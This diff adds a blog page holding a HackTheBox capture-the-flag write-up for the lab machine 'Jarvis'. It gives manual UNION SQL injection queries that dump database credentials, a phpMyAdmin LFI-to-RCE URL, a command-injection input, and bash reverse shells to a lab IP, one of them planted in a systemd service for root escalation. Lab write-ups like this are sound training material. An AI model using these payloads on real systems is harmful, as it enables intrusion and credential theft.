@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+  <head>
+  <meta charset="utf-8" />
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <title>HackTheBox - WriteUp 14 &middot; Pat~ Pat~ Meow~</title>
+  <meta name="description" content="HackTheBox 练手 - Jarvis - SQLi&#43;Systemd" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css" />
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://www.kmahyyg.xyz/css/main.min.css" />
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-123948588-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+  <style>
+    body {
+      background: #ecedef url("https://alicdn.kmahyyg.xyz/asset_files/aether/bgimg.webp") repeat;
+    }
+  </style>
+</head>
+  <body class="single-body">
+    <nav class="nav-bar side-padding">
+  <h1 class="nav-header"><a href="https://www.kmahyyg.xyz/" class="nav-text">Patrick Young</a></h1>
+  <div class="hamburger-menu">
+    <button onclick="hamburgerMenuPressed.call(this)" aria-haspopup="true" aria-expanded="false" aria-controls="menu" aria-label="Menu">
+      <span></span>
+      <span></span>
+    </button>
+    <ul id="menu" class="hamburger-menu-overlay">
+      <li><a href="https://www.kmahyyg.xyz/" class="hamburger-menu-overlay-link">Home</a></li>
+      <li><a href="https://www.kmahyyg.xyz/express-page/" class="hamburger-menu-overlay-link">Express Inc</a></li>
+      <li><a href="https://www.kmahyyg.xyz/about-me-page/" class="hamburger-menu-overlay-link">About</a></li>
+      <li><a href="https://www.kmahyyg.xyz/archlinux-bug-page/" class="hamburger-menu-overlay-link">Arch Linux</a></li>
+      <li><a href="https://www.kmahyyg.xyz/donate-page/" class="hamburger-menu-overlay-link">Donate</a></li>
+      <li><a href="https://www.kmahyyg.xyz/categories/code" class="hamburger-menu-overlay-link">Code</a></li><li><a href="https://www.kmahyyg.xyz/categories/life" class="hamburger-menu-overlay-link">Life</a></li><li><a href="https://www.kmahyyg.xyz/categories/network" class="hamburger-menu-overlay-link">Network</a></li><li><a href="https://www.kmahyyg.xyz/categories/school" class="hamburger-menu-overlay-link">School</a></li><li><a href="https://www.kmahyyg.xyz/categories/tech" class="hamburger-menu-overlay-link">Tech</a></li>
+    </ul>
+  </div>
+</nav>
+    <main class="content side-text-padding">
+      <article class="post ">
+        <header class="post-header">
+        	<h1 class="post-title">HackTheBox - WriteUp 14</h1>
+          <p class="post-date">Posted <time datetime="2019-07-13">Jul 13, 2019</time></p>
+        </header>
+        
+        <picture class="post-figure">
+            
+            <source srcset="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp">
+          <img src="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp" >
+        </picture>
+        
+        
+
+<h1 id="jarvis">Jarvis</h1>
+
+<p>Nmap result: 22,80 with Apache and php.</p>
+
+<p>SQLi Defender enabled, you should avoid <code>'</code> <code>&quot;</code> <code>ORDER/order</code> <code>UNION/union</code> and also <code>9208%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23</code> in command within the request of <code>room.php?cod=</code>, but this defender is a crispy one, so it may not work.</p>
+
+<h1 id="user">User</h1>
+
+<p>Step 1: Sqli</p>
+
+<p><code>room.php?cod=1</code> SQL Injection at param <code>cod</code>. You can use SQLMap and get banned, then wait, then try again, repeat the step, you&rsquo;ll find it.</p>
+
+<p>The manual sqli should achieved like this:</p>
+
+<pre><code>10.10.10.143/room.php?cod=1 order by 7
+10.10.10.143/room.php?cod=-1 union select 1,2,3,4,5,6,7
+10.10.10.143/room.php?cod=-1 union select 1, group_concat(schema_name), 3, 4,
+5, 6, 7 from information_schema.schemata
+10.10.10.143/room.php?cod=-1 union select 1, group_concat(table_name), 3, 4,
+5, 6, 7 from information_schema.tables where table_schema='hotel'
+10.10.10.143/room.php?cod=-1 union select 1, group_concat(column_name), 3, 4,
+5, 6, 7 from information_schema.columns where table_name='room'
+10.10.10.143/room.php?cod=-1 union select 1, group_concat(table_name), 3, 4,
+5, 6, 7 from information_schema.tables where table_schema='mysql'
+10.10.10.143/room.php?cod=-1 union select 1, group_concat(column_name), 3, 4,
+5, 6, 7 from information_schema.columns where table_name='user'
+10.10.10.143/room.php?cod=-1 union select 1, group_concat(User,0x0a,Password),
+3, 4, 5, 6, 7 from mysql.user
+</code></pre>
+
+<p>Step 2: RCE</p>
+
+<p><code>/phpadmin</code> use the credentials you just get <code>DBadmin:imissyou</code>,</p>
+
+<p>then follow the procedure here: <a href="https://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/">https://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/</a></p>
+
+<p>Get the cookie value of phpmyadmin: 3u5vpovmecn9md1dl7du5a4cthnul6pt</p>
+
+<p>The LFI: <code>http://10.10.10.143/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_3u5vpovmecn9md1dl7du5a4cthnul6pt</code></p>
+
+<p>You&rsquo;ll get the shell or <code>www-data</code>.</p>
+
+<pre><code class="language-bash">$ sudo -l
+(pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
+$ python3 -c &quot;import pty;pty.spawn('/bin/sh')&quot;
+$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
+</code></pre>
+
+<p>Upload the prepared shell script and chmod 777.</p>
+
+<pre><code class="language-bash">#!/bin/sh
+bash -c 'bash -i &amp;&gt;/dev/tcp/10.10.14.6/4455 0&lt;&amp;1'
+</code></pre>
+
+<p>Then input: <code>127.0.0.1$(/tmp/143.sh)</code></p>
+
+<p>Then you will have the user flag.</p>
+
+<h1 id="root">Root</h1>
+
+<p>Check SUID file, found <code>/bin/systemctl</code>, then <code>mkdir -p ~/.config/systemd/user/</code></p>
+
+<p>Upload the preparde systemd service to <code>~/.config/systemd/user/</code></p>
+
+<p>The service file looks like:</p>
+
+<pre><code class="language-systemd">[Unit]
+Description=Patrick's Telegram Bot Watchdog
+
+[Service]
+ExecStart=/bin/bash -c '/bin/bash -i &amp;&gt;/dev/tcp/10.10.14.6/4466 0&lt;&amp;1'
+
+[Install]
+WantedBy=multi-user.target
+</code></pre>
+
+<p>Then <code>systemctl enable --now ~/.config/systemd/user/fuckjarv4.service</code></p>
+
+<p>Then you have the root shell.</p>
+
+<p>(END)</p>
+
+      </article>
+      <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "kmahyyg" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+    </main>
+    <nav class="end-nav side-padding">
+      
+      <a ontouchstart="cardPressed.call(this)" ontouchend="cardReleased.call(this)" ontouchmove="cardReleased.call(this)" 
+  href="https://www.kmahyyg.xyz/hioscp/2019-htb-writeup12/" class="card blog-card" rel="bookmark" >
+    
+    <div class="card-img-container">
+      <p class="card-img-overlay">Next Article</p>
+      <picture>
+        
+        <source srcset="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp">
+        <img src="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp" class="card-img" >
+      </picture>
+    </div>
+    
+  <article class="card-body">
+    <h2 class="card-title">HackTheBox - WriteUp 12</h2>
+    <p class="card-text">HackTheBox 练手 - Ghoul - Pivoting</p>
+    <div class="card-subtext muted-text">
+      <p>Posted <time datetime="2019-07-08 78:00">Jul 8, 2019</time></p>
+      <p>#tech </p>
+    </div>
+  </article>
+</a>
+      
+      <a ontouchstart="cardPressed.call(this)" ontouchend="cardReleased.call(this)" ontouchmove="cardReleased.call(this)" 
+  href="https://www.kmahyyg.xyz/" class="card home-card" style="background-image: url( https://alicdn.kmahyyg.xyz/asset_files/aether/backtohome.webp )" rel="bookmark" >
+  Home
+</a>
+    </nav>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.13.1/highlight.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.js" integrity="sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/contrib/auto-render.min.js" integrity="sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe" crossorigin="anonymous"
+    onload="renderMathInElement(document.body);"></script>
+<script src="https://www.kmahyyg.xyz/js/core.js"></script>
+<script>
+  hljs.initHighlightingOnLoad();
+</script>
+  </body>
+</html>
